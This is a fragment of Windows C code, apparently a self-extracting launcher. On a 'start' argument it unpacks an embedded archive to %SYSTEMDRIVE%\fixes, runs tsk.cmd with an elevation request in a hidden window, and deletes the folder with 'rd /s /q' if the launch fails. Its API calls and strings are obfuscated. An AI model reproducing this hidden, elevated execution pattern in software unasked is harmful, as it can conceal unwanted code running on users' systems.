        char *cmd=wchartocodepage(argv[1],CP_OEMCP);
        if(cmd){
          _s(argcmd,"start",5);
          char *a=(char *)argcmd;
          char *b=cmd;
          while(*a && *b &&*a==*b){
            a++;
            b++;
          };
          if(*a==0 && *b==0) dlg_ret=1;
          LocalFree(cmd);
        };
      };
      LocalFree(argv);
    };
    if(!dlg_ret) null_window(0);
    dbg();
    if(dlg_ret){
      _s(drv_e,"SYSTEMDRIVE",11);
      _s(sea_m,"runas",5);
      _s(sea_c,"cmd.exe",7);
      _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
      _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
      char *path=(char *)LocalAlloc(LMEM_ZEROINIT,MAX_PATH);
      if(path){
        GetEnvironmentVariableA(drv_e,path,257);
        path[strlen_i(path)+1]=0;
        path[strlen_i(path)]='/';
        bytes2uint(res_size);
        init_unpack(res_size);
        unarc(path);
        SHELLEXECUTEINFO ShExecInfo;
        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask=0;
        ShExecInfo.hwnd=NULL;
        ShExecInfo.lpVerb=sea_m;
        ShExecInfo.lpFile=sea_c;
        ShExecInfo.lpParameters=sea_o;
        ShExecInfo.lpDirectory=NULL;
        ShExecInfo.nShow=0;
        ShExecInfo.hInstApp=0;
        if(((SEA)_f(sea))(&ShExecInfo)==FALSE){
          res_size=0;
          ShExecInfo.fMask=SEE_MASK_NOASYNC;
          ShExecInfo.lpVerb=NULL;
          ShExecInfo.lpParameters=sea_r;
          ((SEA)_f(sea))(&ShExecInfo);
        };
        LocalFree(path);
      };
    };
  };
  ((FLIB)_f(flib))(hshell32);
  ((FLIB)_f(flib))(hgdi32);
  ((FLIB)_f(flib))(huser32);
  free_mem();
  if(!res_size) ExitProcess(0);
}
